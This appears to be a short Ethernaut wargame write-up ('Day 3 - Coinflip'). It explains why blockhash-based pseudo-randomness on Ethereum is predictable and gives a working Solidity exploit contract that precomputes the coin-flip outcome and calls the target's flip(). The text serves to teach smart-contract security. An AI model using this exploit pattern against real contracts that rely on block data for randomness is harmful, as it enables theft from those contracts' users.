# Day 3 - Coinflip

Don't rely on block number for any validation logic. A malicious user can calculate the solution to bypass your validation if both txns in the same block i.e. wrapped in the same function call.

## Randomness on Ethereum

There’s no true randomness on Ethereum blockchain, only random generators that are considered “good enough”.

Developers currently create psuedo-randomness in Ethereum by hashing variables that are unique, or difficult to tamper with. Examples of such variables include `transaction timestamp`, `sender address`, `block height`, etc.
Ethereum then offers cryptographic hashing functions, KECCAK256, which hash the concatenation string of these input variables.

This generated hash is finally converted into a large integer, and then mod’ed by n. This is to get a discrete set of probability integers, inside the desired range of 0 to n.

In our Ethernaut exercise, n=2 to represent the two sides of a coin flip.

```js
pragma solidity ^0.6.0;
import "./CoinFlip.sol";
import "https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/math/SafeMath.sol";

contract AttackCoinFlip {
  using SafeMath for uint256;
  address public targetContract;
  uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _targetContract) public {
    targetContract = _targetContract;
  }

  // need to create a same CoinFlip contract if use this method
  function attackFlipWithContract() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    CoinFlip(targetContract).flip(side);
  }

  // preferred
  function attackFlipWithoutContract() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    // low level call example: https://solidity-by-example.org/0.6/call/
    bytes memory payload = abi.encodeWithSignature("flip(bool)", coinFlip == 1 ? true : false);
    (bool success, ) = targetContract.call(payload);
    require(success, "Transaction call using encodeWithSignature is not successful");
  }
}
```
